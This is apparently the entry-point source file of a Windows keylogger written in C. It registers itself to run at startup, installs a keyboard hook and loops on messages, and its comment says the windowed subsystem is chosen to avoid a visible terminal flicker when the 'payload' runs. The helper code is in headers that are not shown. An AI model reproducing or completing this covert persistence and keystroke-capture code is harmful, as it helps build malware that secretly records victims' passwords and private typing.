#include "util/keyboard.h"
#include "util/registry.h"
#include <Windows.h>

/*
 * The entry point for the application is a Windows subsystem to prevent a brief 
 * terminal flicker when running the payload.
 */
int APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev_instance,
		      _In_ LPWSTR cmd_line, _In_ int cmd_show) 
{
	LONG rc = add_to_startup();

	if (rc)
		return rc;

	if (!set_keyboard_hook())
		return 1;

	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0));

	return 0;
}
